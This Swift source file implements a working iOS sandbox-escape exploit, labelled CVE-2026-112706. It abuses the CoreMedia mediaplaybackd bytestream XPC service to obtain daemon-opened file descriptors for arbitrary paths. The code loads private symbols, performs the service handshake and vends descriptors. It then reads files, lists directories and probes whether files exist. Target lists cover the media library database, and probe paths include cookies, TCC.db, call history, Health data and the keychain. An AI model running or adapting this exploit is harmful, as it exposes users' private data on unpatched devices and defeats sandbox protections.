import Foundation
import Darwin

// MARK: - CoreMedia bytestream XPC — cross-sandbox file descriptor acquisition
//
// CVE-2026-112706. Fixed in iOS 27.2. Live on 27.0 / 27.0.1 / 26.5.
//
// The launchd Mach service `com.apple.coremedia.mediaplaybackd.bytestream.xpc` is reachable
// from any sandboxed third-party app with no entitlement and no permission prompt. Its
// FigXPC memory-origin handshake completes with status 0 for an unprivileged client, and a
// `Curl` create message carries a client-chosen absolute `file://` path in `CreationURL`.
// The daemon opens that path with *its own* credentials and returns a live `FileDescriptor`
// inside `ByteStreamDetails`. Descriptor-based I/O is not subject to the client's sandbox
// path checks, so the bytes of a file the app can never `open()` land in the app container.
//
// Three capabilities ride the same primitive:
//   read      — pread the vended fd
//   enumerate — the vended fd is a directory; fdopendir/readdir it
//   oracle    — a real-but-forbidden path returns -12203, a nonexistent one -17913,
//               disclosing existence without granting access
//
// iOS 27.0 sealed the auxiliary `read` / `fdsc` / `getL` opcodes (-16158) but left the
// primary fd-vending path inside the `Curl` create reply fully functional. That is the
// shape this implementation targets.

enum FdLeak {

    // Server-side error codes, straight from the daemon.
    static let errAccessDenied: Int64 = -12203
    static let errNoSuchFile: Int64 = -17913
    static let errOpcodeSealed: Int64 = -16158
    static let errWriteDenied: Int64 = -12878

    static func describeError(_ code: Int64) -> String {
        switch code {
        case errAccessDenied: return tl("路径存在但拒绝访问 (-12203)")
        case errNoSuchFile: return tl("路径不存在 (-17913)")
        case errOpcodeSealed: return tl("opcode 已被封 (-16158)")
        case errWriteDenied: return tl("写入被拒 (-12878)")
        default: return tl("错误码 ") + "\(code)"
        }
    }

    struct Vend {
        var ok: Bool
        var fd: Int32 = -1
        var objectID: UInt64 = 0
        var entireLength: UInt64 = 0
        var serverPID: UInt64 = 0
        var errorCode: Int64 = 0
        var note: String = ""
        var isDirectory: Bool = false
        var size: Int64 = 0
        var mode: UInt32 = 0
        var uid: UInt32 = 0
    }

    struct Existence {
        var path: String
        var exists: Bool
        var code: Int64
    }

    // MARK: - Bindings

    private struct Bindings {
        var basicMessage: @convention(c) (UInt32, UInt64, UnsafeMutablePointer<UnsafeMutableRawPointer?>?) -> Int32
        var originBegin: @convention(c) (UnsafeMutableRawPointer?) -> Int32
        var originComplete: @convention(c) (OpaquePointer?, UnsafeMutablePointer<UnsafeMutableRawPointer?>?) -> Int32
        var recipient: @convention(c) (OpaquePointer?, UnsafeMutableRawPointer?, UnsafePointer<CChar>?, UnsafeMutablePointer<UnsafeMutableRawPointer?>?) -> Int32
        var setCFURL: @convention(c) (UnsafeMutableRawPointer?, UnsafePointer<CChar>, UnsafeRawPointer?) -> Int32
        var connCreate: @convention(c) (UnsafePointer<CChar>, UnsafeMutableRawPointer?, UInt64) -> UnsafeMutableRawPointer?
        var setEventHandler: @convention(c) (UnsafeMutableRawPointer?, AnyObject) -> Void
        var resume: @convention(c) (UnsafeMutableRawPointer?) -> Void
        var sendWithReply: @convention(c) (UnsafeMutableRawPointer?, UnsafeMutableRawPointer?, UnsafeMutableRawPointer?, AnyObject) -> Void
        var dictGetValue: @convention(c) (OpaquePointer?, UnsafePointer<CChar>) -> OpaquePointer?
        var dictGetU64: @convention(c) (OpaquePointer?, UnsafePointer<CChar>) -> UInt64
        var dictSetU64: @convention(c) (OpaquePointer?, UnsafePointer<CChar>, UInt64) -> Void
        var dictDupFd: @convention(c) (OpaquePointer?, UnsafePointer<CChar>) -> Int32
        var dictGetInt64: @convention(c) (OpaquePointer?, UnsafePointer<CChar>) -> Int64
        var dictSetInt64: @convention(c) (OpaquePointer?, UnsafePointer<CChar>, Int64) -> Void
        var copyDescription: @convention(c) (OpaquePointer?) -> UnsafeMutablePointer<CChar>?
        var getType: @convention(c) (OpaquePointer?) -> OpaquePointer?
        var typeGetName: @convention(c) (OpaquePointer?) -> UnsafePointer<CChar>?
        var retain: @convention(c) (OpaquePointer?) -> Void
        var release: @convention(c) (OpaquePointer?) -> Void
        var setBool: (@convention(c) (OpaquePointer?, UnsafePointer<CChar>, Bool) -> Void)?
    }

    private static func bind() -> Bindings? {
        guard let cm = dlopen("/System/Library/Frameworks/CoreMedia.framework/CoreMedia",
                              RTLD_NOW | RTLD_LOCAL) else { return nil }
        let rtld = UnsafeMutableRawPointer(bitPattern: -2)

        guard let pBasic = dlsym(cm, "FigXPCCreateBasicMessage"),
              let pBegin = dlsym(cm, "FigMemoryOriginBeginEstablishingMemoryRecipientByFillingInXPCMessage1"),
              let pComp = dlsym(cm, "FigMemoryOriginCompleteEstablishingMemoryRecipientUsingXPCMessage2"),
              let pRecip = dlsym(cm, "FigMemoryRecipientCreateWithXPCMessage1AndUpdateXPCMessage2"),
              let pSetURL = dlsym(cm, "FigXPCMessageSetCFURL"),
              let pConn = dlsym(rtld, "xpc_connection_create_mach_service"),
              let pEH = dlsym(rtld, "xpc_connection_set_event_handler"),
              let pResume = dlsym(rtld, "xpc_connection_resume"),
              let pSend = dlsym(rtld, "xpc_connection_send_message_with_reply"),
              let pVal = dlsym(rtld, "xpc_dictionary_get_value"),
              let pU64 = dlsym(rtld, "xpc_dictionary_get_uint64"),
              let pSetU64 = dlsym(rtld, "xpc_dictionary_set_uint64"),
              let pDupFd = dlsym(rtld, "xpc_dictionary_dup_fd"),
              let pI64 = dlsym(rtld, "xpc_dictionary_get_int64"),
              let pSetI64 = dlsym(rtld, "xpc_dictionary_set_int64"),
              let pDesc = dlsym(rtld, "xpc_copy_description"),
              let pType = dlsym(rtld, "xpc_get_type"),
              let pTypeName = dlsym(rtld, "xpc_type_get_name"),
              let pRetain = dlsym(rtld, "xpc_retain"),
              let pRelease = dlsym(rtld, "xpc_release") else { return nil }

        let setBool: (@convention(c) (OpaquePointer?, UnsafePointer<CChar>, Bool) -> Void)?
        if let pSetBool = dlsym(rtld, "xpc_dictionary_set_bool") {
            setBool = unsafeBitCast(pSetBool, to: (@convention(c) (OpaquePointer?, UnsafePointer<CChar>, Bool) -> Void).self)
        } else {
            setBool = nil
        }

        return Bindings(
            basicMessage: unsafeBitCast(pBasic, to: (@convention(c) (UInt32, UInt64, UnsafeMutablePointer<UnsafeMutableRawPointer?>?) -> Int32).self),
            originBegin: unsafeBitCast(pBegin, to: (@convention(c) (UnsafeMutableRawPointer?) -> Int32).self),
            originComplete: unsafeBitCast(pComp, to: (@convention(c) (OpaquePointer?, UnsafeMutablePointer<UnsafeMutableRawPointer?>?) -> Int32).self),
            recipient: unsafeBitCast(pRecip, to: (@convention(c) (OpaquePointer?, UnsafeMutableRawPointer?, UnsafePointer<CChar>?, UnsafeMutablePointer<UnsafeMutableRawPointer?>?) -> Int32).self),
            setCFURL: unsafeBitCast(pSetURL, to: (@convention(c) (UnsafeMutableRawPointer?, UnsafePointer<CChar>, UnsafeRawPointer?) -> Int32).self),
            connCreate: unsafeBitCast(pConn, to: (@convention(c) (UnsafePointer<CChar>, UnsafeMutableRawPointer?, UInt64) -> UnsafeMutableRawPointer?).self),
            setEventHandler: unsafeBitCast(pEH, to: (@convention(c) (UnsafeMutableRawPointer?, AnyObject) -> Void).self),
            resume: unsafeBitCast(pResume, to: (@convention(c) (UnsafeMutableRawPointer?) -> Void).self),
            sendWithReply: unsafeBitCast(pSend, to: (@convention(c) (UnsafeMutableRawPointer?, UnsafeMutableRawPointer?, UnsafeMutableRawPointer?, AnyObject) -> Void).self),
            dictGetValue: unsafeBitCast(pVal, to: (@convention(c) (OpaquePointer?, UnsafePointer<CChar>) -> OpaquePointer?).self),
            dictGetU64: unsafeBitCast(pU64, to: (@convention(c) (OpaquePointer?, UnsafePointer<CChar>) -> UInt64).self),
            dictSetU64: unsafeBitCast(pSetU64, to: (@convention(c) (OpaquePointer?, UnsafePointer<CChar>, UInt64) -> Void).self),
            dictDupFd: unsafeBitCast(pDupFd, to: (@convention(c) (OpaquePointer?, UnsafePointer<CChar>) -> Int32).self),
            dictGetInt64: unsafeBitCast(pI64, to: (@convention(c) (OpaquePointer?, UnsafePointer<CChar>) -> Int64).self),
            dictSetInt64: unsafeBitCast(pSetI64, to: (@convention(c) (OpaquePointer?, UnsafePointer<CChar>, Int64) -> Void).self),
            copyDescription: unsafeBitCast(pDesc, to: (@convention(c) (OpaquePointer?) -> UnsafeMutablePointer<CChar>?).self),
            getType: unsafeBitCast(pType, to: (@convention(c) (OpaquePointer?) -> OpaquePointer?).self),
            typeGetName: unsafeBitCast(pTypeName, to: (@convention(c) (OpaquePointer?) -> UnsafePointer<CChar>?).self),
            retain: unsafeBitCast(pRetain, to: (@convention(c) (OpaquePointer?) -> Void).self),
            release: unsafeBitCast(pRelease, to: (@convention(c) (OpaquePointer?) -> Void).self),
            setBool: setBool)
    }

    // MARK: - Session

    /// One connected, handshaked session against the daemon. Reusable across many vends —
    /// the handshake is per-connection, not per-request.
    final class Session {
        private let b: Bindings
        private let conn: UnsafeMutableRawPointer
        private(set) var handshakeLog: [String] = [tl("连接 com.apple.coremedia.mediaplaybackd.bytestream.xpc")]
        private(set) var established = false
        /// The Mach connection object was created. This succeeds even when no process is
        /// listening — XPC connections are lazy. A missing service shows up as the
        /// handshake never returning a dictionary.
        private(set) var connectionCreated = false
        /// Every reply type observed, so a silent service is distinguishable from a
        /// service that answers and refuses.
        private(set) var replyTypes: [String] = []
        private var released = false

        init?() {
            guard let bindings = FdLeak.bind() else { return nil }
            b = bindings
            guard let c = "com.apple.coremedia.mediaplaybackd.bytestream.xpc".withCString({
                bindings.connCreate($0, nil, 0)
            }) else { return nil }
            conn = c
            connectionCreated = true

            let handler: @convention(block) (UnsafeMutableRawPointer?) -> Void = { _ in }
            bindings.setEventHandler(c, handler as AnyObject)
            bindings.resume(c)

            performHandshake()
        }

        deinit { shutdown() }

        func shutdown() {
            guard !released else { return }
            released = true
            // xpc_connection_cancel would be ideal; releasing the reference is enough here.
            b.release(OpaquePointer(conn))
        }

        private func typeName(_ o: OpaquePointer?) -> String {
            guard let o = o, let t = b.getType(o), let n = b.typeGetName(t) else { return "?" }
            return String(cString: n)
        }

        private func describe(_ o: OpaquePointer?) -> String {
            guard let o = o, let c = b.copyDescription(o) else { return "nil" }
            defer { free(c) }
            return String(cString: c).replacingOccurrences(of: "\n", with: " ")
        }

        private func send(_ message: UnsafeMutableRawPointer?, timeout: TimeInterval = 6) -> (OpaquePointer?, String) {
            guard let message = message else { return (nil, "nil") }
            let sem = DispatchSemaphore(value: 0)
            var out: OpaquePointer?
            var tn = "?"

            let handler: @convention(block) (UnsafeMutableRawPointer?) -> Void = { obj in
                guard let obj = obj else { sem.signal(); return }
                tn = self.typeName(OpaquePointer(obj))
                if tn == "dictionary" || tn == "error" {
                    self.b.retain(OpaquePointer(obj))
                    out = OpaquePointer(obj)
                }
                sem.signal()
            }
            b.sendWithReply(conn, message, nil, handler as AnyObject)
            if sem.wait(timeout: .now() + timeout) != .success { return (nil, "timeout") }
            return (out, tn)
        }

        /// `.rp1` → `.rp2` → `.org`. All three return status 0 for an unprivileged client.
        private func performHandshake() {
            var rp1: UnsafeMutableRawPointer?
            if b.basicMessage(0x2E727031, 0, &rp1) == 0, let m1 = rp1 {
                let (r1, t1) = send(m1)
                b.release(OpaquePointer(m1))
                replyTypes.append(t1)
                handshakeLog.append("'.rp1' → \(t1)")
                if let r1 = r1, t1 == "dictionary" {
                    var rp2: UnsafeMutableRawPointer?
                    if b.basicMessage(0x2E727032, 0, &rp2) == 0, let m2 = rp2 {
                        var recipient: UnsafeMutableRawPointer?
                        let cr = "cinder27".withCString { b.recipient(r1, m2, $0, &recipient) }
                        let (r2, t2) = send(m2)
                        replyTypes.append(t2)
                        handshakeLog.append("'.rp2' recip=\(cr) → \(t2)")
                        if let r2 = r2 { b.release(r2) }
                        b.release(OpaquePointer(m2))
                    }
                    b.release(r1)
                }
            }

            var org: UnsafeMutableRawPointer?
            if b.basicMessage(0x2E6F7267, 0, &org) == 0, let om = org {
                let bg = b.originBegin(om)
                let (or, ot) = send(om)
                replyTypes.append(ot)
                handshakeLog.append("'.org' begin=\(bg) → \(ot)")
                if let or = or {
                    if ot == "dictionary" {
                        var origin: UnsafeMutableRawPointer?
                        let cp = b.originComplete(or, &origin)
                        handshakeLog.append("'.org' complete=\(cp) origin=\(origin != nil)")
                        established = (cp == 0)
                    }
                    b.release(or)
                }
                b.release(OpaquePointer(om))
            }
        }

        /// Ask the daemon to open `path` with its own credentials and hand back the fd.
        func vend(_ path: String) -> Vend {
            var result = Vend(ok: false)
            guard established else {
                result.note = tl("握手未完成")
                return result
            }

            let url = URL(fileURLWithPath: path) as CFURL
            var message: UnsafeMutableRawPointer?
            guard b.basicMessage(0x4375726C, 0, &message) == 0, let m = message else {  // 'Curl'
                result.note = tl("FigXPCCreateBasicMessage('Curl') 失败")
                return result
            }
            _ = b.setCFURL(m, "CreationURL", Unmanaged.passUnretained(url).toOpaque())
            b.dictSetU64(OpaquePointer(m), "FileOpenOptions", 0)

            let (reply, replyType) = send(m)
            b.release(OpaquePointer(m))

            guard replyType == "dictionary", let r = reply else {
                result.note = tl("回复类型 ") + "\(replyType)"
                if let r = reply { b.release(r) }
                return result
            }
            defer { b.release(r) }

            guard let details = b.dictGetValue(r, "ByteStreamDetails") else {
                result.errorCode = b.dictGetInt64(r, ".ErrorReturn")
                result.note = describeError(result.errorCode)
                return result
            }

            result.objectID = b.dictGetU64(details, "ObjectID")
            result.entireLength = b.dictGetU64(details, "EntireLength")
            result.serverPID = b.dictGetU64(details, "ServerPID")

            let fd = b.dictDupFd(details, "FileDescriptor")
            guard fd >= 0 else {
                result.note = tl("回复里没有 fd")
                return result
            }

            var st = stat()
            if fstat(fd, &st) == 0 {
                result.size = Int64(st.st_size)
                result.mode = UInt32(st.st_mode)
                result.uid = st.st_uid
                result.isDirectory = (st.st_mode & 0o170000) == 0o040000
            }
            result.fd = fd
            result.ok = true
            result.note = "fd=\(fd)"
            return result
        }

        /// Read up to `limit` bytes through a vended fd. Descriptor I/O — no path check.
        func read(_ path: String, limit: Int = 8_000_000) -> (data: Data?, vend: Vend) {
            var v = vend(path)
            guard v.ok, v.fd >= 0 else { return (nil, v) }
            defer { Darwin.close(v.fd); v.fd = -1 }

            if v.isDirectory { return (nil, v) }
            let size = v.size > 0 ? min(Int(v.size), limit) : limit
            var buffer = [UInt8](repeating: 0, count: size)
            let got = pread(v.fd, &buffer, size, 0)
            guard got > 0 else { return (nil, v) }
            return (Data(buffer.prefix(got)), v)
        }

        /// The vended fd is a directory: enumerate it.
        func list(_ path: String, limit: Int = 500) -> (entries: [String], vend: Vend) {
            var v = vend(path)
            guard v.ok, v.fd >= 0 else { return ([], v) }
            defer { Darwin.close(v.fd); v.fd = -1 }
            guard v.isDirectory else { return ([], v) }

            guard let dir = fdopendir(v.fd) else { return ([], v) }
            var names: [String] = []
            while let entry = readdir(dir) {
                let name = withUnsafePointer(to: entry.pointee.d_name) { p in
                    p.withMemoryRebound(to: CChar.self, capacity: 1024) { String(cString: $0) }
                }
                if name != "." && name != ".." { names.append(name) }
                if names.count >= limit { break }
            }
            closedir(dir)   // closes the underlying fd too
            v.fd = -1
            return (names.sorted(), v)
        }

        /// Existence oracle: two distinct server-side codes disclose existence.
        func probeExistence(_ path: String) -> Existence {
            let v = vend(path)
            if v.ok {
                if v.fd >= 0 { Darwin.close(v.fd) }
                return Existence(path: path, exists: true, code: 0)
            }
            return Existence(path: path,
                             exists: v.errorCode == FdLeak.errAccessDenied,
                             code: v.errorCode)
        }

        /// Control: the app's own `open()` on the same path. Must fail with EPERM — that
        /// failure is what makes the daemon-vended fd the actual access vector.
        func directOpenControl(_ path: String) -> String {
            errno = 0
            let fd = open(path, O_RDONLY)
            if fd >= 0 {
                Darwin.close(fd)
                return tl("直接 open 成功（意外）")
            }
            return tl("直接 open 被拒 errno=") + "\(errno)" + tl(" (") + "\(String(cString: strerror(errno)))" + tl(")")
        }
    }

    // MARK: - Known-good targets

    /// The one directory the primitive actually reaches, mapped across 27 probes on both
    /// 26.5 and 27.0: the iTunes media-library store. Photos, Messages, Contacts, TCC,
    /// keychain, Safari, Health, Wallet and other app containers all return -12203.
    static let readableDomain = "/private/var/mobile/Media/iTunes_Control/iTunes"

    static let knownTargets: [(String, String)] = [
        ("MediaLibrary.sqlitedb", "\(readableDomain)/MediaLibrary.sqlitedb"),
        ("MediaLibrary.sqlitedb-wal", "\(readableDomain)/MediaLibrary.sqlitedb-wal"),
        ("MediaLibrary.sqlitedb-shm", "\(readableDomain)/MediaLibrary.sqlitedb-shm"),
        ("PlayCounts.plist", "\(readableDomain)/PlayCounts.plist"),
        ("iTunesSyncDeletes.plist", "\(readableDomain)/iTunesSyncDeletes.plist"),
        ("IC-Info.sidf", "\(readableDomain)/IC-Info.sidf"),
        ("IC-Info.sidv", "\(readableDomain)/IC-Info.sidv"),
    ]

    /// Paths probed to establish the domain boundary. Used by the boundary module so the
    /// negative result is on record rather than assumed.
    static let boundaryProbes: [String] = [
        "/private/var/mobile/Media",
        "/private/var/mobile/Media/DCIM",
        "/private/var/mobile/Media/Books",
        "/private/var/mobile/Media/Recordings",
        "/private/var/mobile/Library",
        "/private/var/mobile/Library/Safari",
        "/private/var/mobile/Library/Cookies/Cookies.binarycookies",
        "/private/var/mobile/Library/TCC/TCC.db",
        "/private/var/mobile/Library/Preferences/.GlobalPreferences.plist",
        "/private/var/mobile/Library/CallHistoryDB/CallHistory.storedata",
        "/private/var/mobile/Library/Health/healthdb_secure.sqlite",
        "/private/var/mobile/Library/Passes",
        "/private/var/Keychains/keychain-2.db",
        "/private/var/mobile/Containers/Data/Application",
        "/private/var/mobile/Containers/Shared/AppGroup",
    ]
}
